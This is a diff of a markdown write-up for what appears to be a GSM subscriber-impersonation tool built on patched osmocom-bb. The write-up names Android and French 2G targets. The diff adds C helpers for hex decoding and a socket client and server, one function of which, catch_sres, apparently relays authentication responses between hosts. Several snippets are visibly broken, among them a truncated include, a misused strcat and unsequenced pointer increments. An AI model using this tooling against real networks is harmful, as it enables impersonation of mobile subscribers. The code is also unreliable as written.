@@ -546,7 +546,184 @@ What happen next ?
 Targets android < 12, telco 2G until 2025 in France
 
 Thank for reading (see after for impersonation patches)
+suppress_space.h
+```c
+nclude <stdio.h>
+char res[100];
+char* spaces(char str [])
+{
+int i = 0;int j = 0;
+       while (str[i] != '\0')
+       {
+          if ((str[i] == ' ') != 1) {
+            res[j] = str[i];
+            j++;
+          }
+          i++;
+       }
+       res[j] = '\0';
+return res;}
+```
+hex.h
+```c
+/*
+ * Read hex strings and output as text.
+ *
+ * No checking of the characters is done, but the strings must have an even
+ * length.
+ *
+ * $Id: hex2ascii.c,v 1.1 2009/09/19 23:56:49 grog Exp $
+ */
 
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include "suppress_space.h"
+char hexdigit (char c)
+{
+  char outc;
+
+  outc = c -'0';
+  if (outc > 9)                                 /* A - F or a - f */
+    outc -= 7;                                  /* A - F */
+  if (outc > 15)                                /* a - f? */
+    outc -= 32;
+  if ((outc > 15) || (outc < 0))
+  {
+    fprintf (stderr, "Invalid character %c, aborting\n", c);
+    exit (1);
+  }
+  return outc;
+}
+char ascii[17];
+const unsigned char* hex2ascii(char hexval[])
+{  int arg;
+  char *c=spaces(hexval);
+  int sl;
+  char oc;
+
+  for (arg = 0; arg < 17; arg++)
+  {
+    sl = strlen (c);
+    if (sl & 1)                                 /* odd length */
+    {
+      fprintf (stderr,
+               "%s is %d chars long, must be even\n",
+               c,
+               sl );
+      return "prout";
+    }int i=0;
+    while (*c)
+    {
+      oc = (hexdigit (*c++) << 4) + hexdigit (*c++);
+      fputc (oc, stdout);
+      strcat(ascii,&oc);
+    }
+  }
+return ascii;}
+
+```
+client.h
+
+```c
+/**
+ * Example taken from CS 241 @ UIUC
+ * Edited by Austin Walters
+ * Used as example for austingwalters.com,
+ * in socket IPC explanation.
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <unistd.h>
+
+void client(char buffer[]){
+
+  int sock_fd = socket(AF_INET, SOCK_STREAM, 0);
+
+  struct addrinfo info, *result;
+  memset(&info, 0, sizeof(struct addrinfo));
+  info.ai_family = AF_INET;
+  info.ai_socktype = SOCK_STREAM;
+
+  if(0 != getaddrinfo("172.17.0.3", "888", &info, &result))
+    exit(1);
+  
+  /* Connects to bound socket on the server */  
+  connect(sock_fd, result->ai_addr, result->ai_addrlen);
+
+  printf("SENDING: %s", buffer);
+  write(sock_fd, buffer, strlen(buffer));
+
+  char resp[999];
+  int len = strlen(buffer);
+  resp[len] = '\0';
+  printf("%s\n", resp);
+}
+```
+server.h
+
+```c
+/**
+ * Written by Austin Walters
+ * For an example on austingwalters.com,
+ * on sockets
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <unistd.h>
+char text[13];
+char* catch_sres(){
+
+  int sock_fd = socket(AF_INET, SOCK_STREAM, 0);
+  struct addrinfo directives, *result;
+  memset(&directives, 0, sizeof(struct addrinfo));
+  directives.ai_family = AF_INET;
+  directives.ai_socktype = SOCK_STREAM;
+  directives.ai_flags = AI_PASSIVE;
+
+  /* Translates IP, port, protocal into struct */
+  if(0 !=  getaddrinfo("0.0.0.0", "666", &directives, &result))
+    exit(1);
+ 
+  /* Binds socket to port, so we know where new connections form */
+  if(bind(sock_fd, result->ai_addr, result->ai_addrlen) != 0)
+      exit(1);
+  /* Places socket to "listen" or "wait for stuff" state */
+  if(listen(sock_fd, 10) != 0)
+      exit(1);
+  int i=0;
+  printf("Waiting for connection on http://0.0.0.0:666 ...\n");
+  while(i==0){
+   
+    /* Accepts Connection */
+    char buffer[1000];
+    int client_fd = accept(sock_fd, NULL, NULL); 
+    int len = read(client_fd, buffer, 999);
+    buffer[len] = '\0';
+    
+    char * header = "<b>You Connected to the Server!</b></br></br>";
+    i=i+1;
+    write(client_fd, header, strlen(header));
+    
+    printf("=== Client Sent ===\n");
+    printf("%s\n", buffer);
+    memcpy(text,buffer,13);
+    close(client_fd);
+
+  }
+  return text;
+}
+```
 ```patch
 diff -ru osmocom-bb/src/host/layer23/src/mobile/gsm48_mm.c heartbreaker/bb-2rfa/src/host/layer23/src/mobile/gsm48_mm.c
 --- osmocom-bb/src/host/layer23/src/mobile/gsm48_mm.c	2022-08-30 15:39:46.222274989 +0200
@@ -626,24 +803,9 @@ diff -ru osmocom-bb/src/host/layer23/src/mobile/subscriber.c heartbreaker/bb-2rf
  
  		return 0;
 ```
-suppress_space.h
-```c
-nclude <stdio.h>
-char res[100];
-char* spaces(char str [])
-{
-int i = 0;int j = 0;
-       while (str[i] != '\0')
-       {
-          if ((str[i] == ' ') != 1) {
-            res[j] = str[i];
-            j++;
-          }
-          i++;
-       }
-       res[j] = '\0';
-return res;}
-```
+
+
+
 Patch osmocom-bb
 
 ```bash
